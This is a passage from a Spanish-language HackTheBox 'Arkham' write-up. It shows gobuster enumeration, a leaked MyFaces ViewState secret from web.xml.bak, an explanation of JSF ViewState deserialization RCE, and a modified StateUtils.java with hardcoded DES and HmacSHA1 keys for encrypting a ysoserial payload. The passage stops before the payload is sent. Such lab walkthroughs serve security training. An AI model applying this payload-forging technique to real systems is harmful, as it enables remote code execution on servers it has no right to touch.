&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.MAC_SECRE&lt;span class=&#34;nt&#34;&gt;&amp;lt;T&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/param-name&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;SnNGOTg3Ni0=&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;website-puerto-8080-&#34;&gt;Website Puerto 8080&lt;/h2&gt;
&lt;p&gt;Puerto 8080 en http.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-03-25%2017-47-40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster-&#34;&gt;Gobuster&lt;/h2&gt;
&lt;p&gt;Considerando que la pagina esta corrriendo en un apache myfaces (&lt;code&gt;web.xml.bak&lt;/code&gt;), vamos a utilizar gobuster para buscar directorios y documentos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2016.58.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos directorios y documentos pertenecientes a la pagina, al visitar cada una de las opciones de la pagina nos encontramos una para una subscripcion de correo electronico &lt;code&gt;/userSubscribe.faces&lt;/code&gt; la cual no aparecio con gobuster.&lt;/p&gt;
&lt;h3 id=&#34;usersubscribefaces-&#34;&gt;/userSubscribe.faces&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.02.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al registrar un correo nos redirige a otra pagina &lt;code&gt;/thankyou.faces&lt;/code&gt; con un mensaje de registro.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.03.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;viewstate---arkham-&#34;&gt;ViewState - Arkham&lt;/h3&gt;
&lt;p&gt;Al revisar el codigo fuente de &lt;code&gt;userSubscribe.faces&lt;/code&gt; encontramos algunos valores pertenecen a &lt;code&gt;javax.faces.ViewState&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.07.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;viewstate-&#34;&gt;ViewState&lt;/h2&gt;
&lt;p&gt;JSF utiliza viewStates para almacenar los datos de la vista, pueden ser &amp;lsquo;almacenados&amp;rsquo; en el servidor o el cliente, dichos valores de viewstate estan dentro del html de una pagina como un campo oculto con el nombre de &lt;code&gt;javax.faces.ViewState&lt;/code&gt;, como es el caso de la pagina que encontramos.&lt;/p&gt;
&lt;h1 id=&#34;java-deserialization-&#34;&gt;Java Deserialization&lt;/h1&gt;
&lt;p&gt;Deserializacion y Serializacion es el proceso por el cual se convierte un objeto a bytes y viceversa, para leerlo e interpretarlo por el servidor. Al investigar acerca de dichos valores encontramos que, existe una vulnerabilidad de deserializacion en java, dichos valores del viewstate estan codificados en base64 en algunos casos no estan encriptados por lo que puede ser leido el contenido.&lt;/p&gt;
&lt;p&gt;Al intentar decodificar en base64 nos muestran algunos caracteres, por lo que podemos afirmar que el objeto esta encriptado.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.16.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;jsf-viewstate-rce-&#34;&gt;JSF ViewState RCE&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;INFO:&lt;/strong&gt; &lt;a href=&#34;https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html&#34;&gt;&lt;strong&gt;JSF ViewStates RCE - Vulnerability&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Encontramos un post el cual habla de una vulnerabilidad RCE de ViewState en las implementaciones de JSF como Oracle Mojarra (&lt;code&gt;JSF reference implementation&lt;/code&gt;), &lt;code&gt;Apache MyFaces&lt;/code&gt;. Existen dos &amp;lsquo;tipos&amp;rsquo; de ViewState, el que se almacena en el servidor y el cliente, ambos son objetos serializados, para que dicha vulnerabilidad sea aprovechada para la ejecucion de comandos deben de cumplirse algunas condiciones, el viewstate no debe de estar encriptado, en el caso de Mojarra el viewstate debe de estar configurado en el cliente, en MyFaces puede estar configurado en el cliente o servidor.&lt;/p&gt;
&lt;p&gt;En el caso de MyFaces encriptar el &lt;code&gt;ViewState&lt;/code&gt; esta por defecto activado, puede ser desactivado para hacer tests configurando el parametro de &lt;code&gt;org.apache.myfaces.USE_ENCRYPTION = false&lt;/code&gt; y tambien puede utilizar una contrase√±a para la encriptacion. Tambien nos dice que por defecto Myfaces utiliza &lt;code&gt;DES&lt;/code&gt; como algoritmo de encriptacion y &lt;code&gt;HMAC-SHA1&lt;/code&gt; para autenticar el ViewState. Por defecto el almacenamiento del ViewState esta configurado por el lado del servidor &lt;code&gt;javax.faces.STATE_SAVING_METHOD = server&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;INFO:&lt;/strong&gt; &lt;a href=&#34;https://wiki.apache.org/myfaces/Secure_Your_Application&#34;&gt;&lt;strong&gt;Secure Your Application&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Algunos post sobre JAVA Deseralization:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://securitycafe.ro/2017/11/03/tricking-java-serialization-for-a-treat/&#34;&gt;&lt;strong&gt;Java Serialization&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/&#34;&gt;&lt;strong&gt;Java Serialization with burp and ysoserial&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a&#34;&gt;&lt;strong&gt;Deserialization Vulnerability - $1500&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Ahora que sabemos todo esto, podemos volver a nuestro archivo &lt;code&gt;web.xml.bak&lt;/code&gt; el cual contiene algunos parametros que pueden ser de utilidad para aprovechar el RCE del ViewState y ejecutar comandos dentro de la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;javax.faces.STATE_SAVING_METHOD&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;server&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tambien tiene una contrase√±a que es utilizada para encriptar el viewstate.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.SECRET&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;SnNGOTg3Ni0=&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El algoritmo de autenticacion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.MAC_ALGORITHM&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;HmacSHA1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Mensaje de autenticacion para el algoritmo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.MAC_SECRET&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;SnNGOTg3Ni0=&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;stateutilsjava-&#34;&gt;StateUtils.java&lt;/h2&gt;
&lt;p&gt;Existen algunas herramientas para explotacion de deserializacion en java como &lt;a href=&#34;https://github.com/joaomatosf/jexboss&#34;&gt;&lt;strong&gt;jexboss&lt;/strong&gt;&lt;/a&gt; y &lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;&lt;strong&gt;ysoserial&lt;/strong&gt;&lt;/a&gt;, tambien existe una version modificada de &lt;a href=&#34;https://github.com/pimps/ysoserial-modified&#34;&gt;&lt;strong&gt;ysoserial-modified&lt;/strong&gt;&lt;/a&gt;. Al intentar utilizar estas herramientas contra la maquina no funcionan, por el tipo de encriptacion en la configuracion del archivo (&lt;code&gt;web.xml.bak&lt;/code&gt;), estas herramientas aprovechan el viewstatate cuando no estan encriptadas.&lt;/p&gt;
&lt;p&gt;Para arkham vamos a utilizar ysoserial-modified para generar un payload y encriptarlo por medio de la clase de &lt;a href=&#34;https://github.com/apache/myfaces&#34;&gt;&lt;strong&gt;apache myfaces&lt;/strong&gt;&lt;/a&gt;, StateUtils.java, esta clase &lt;a href=&#34;https://myfaces.apache.org/core22/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html&#34;&gt;&lt;strong&gt;StateUtils.java&lt;/strong&gt;&lt;/a&gt; contiene metodos que pueden construir y reconstruir un valor de viewstate.&lt;/p&gt;
&lt;p&gt;Configuracion de los campos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Logger&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Logger&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getLogger&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;StateUtils&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//Cambio por HmacSHA1
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;macAlgorithm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;HmacSHA1&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//Cambio por MAC_SECRET -&amp;gt; SnNGOTg3Ni0=
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//public static final String INIT_MAC_SECRET = &amp;#34;MAC_SECRET&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//public static final String INIT_MAC_SECRET_KEY_CACHE = &amp;#34;org.apache.myfaces.MAC_SECRET.CACHE&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//configuracion Local encrypt/decrypt
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encodedKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;SnNGOTg3Ni0=&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;        
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decodedKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encodedKey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getBytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SecretKey&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;secretKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SecretKeySpec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decodedKey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;DES&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;    
&lt;span class=&#34;c1&#34;&gt;//configuracion Local encrypt/decrypt
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;macSecretStr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;SnNGOTg3Ni0=&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;macSecretBytes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;macSecretStr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getBytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SecretKey&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;macSecretKey&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SecretKeySpec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;macSecretBytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;macAlgorithm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;    
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ZIP_CHARSET&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ISO-8859-1&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// String DEFAULT_ALGORITHM = &amp;#34;DES&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;algorithm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;DES&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// String DEFAULT_ALGORITHM_PARAMS = &amp;#34;ECB/PKCS5Padding&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;algorithmParams&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ECB/PKCS5Padding&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Metodos, se eliminan todos los valores ExternalContext, ServletContext:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;construct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 
&lt;span class=&#34;n&#34;&gt;reconstruct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;encrypt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;insecure&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;secure&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    
&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;getAsObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;getAsByteArray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos un metodo para enviar nuestro payload:&lt;/p&gt;
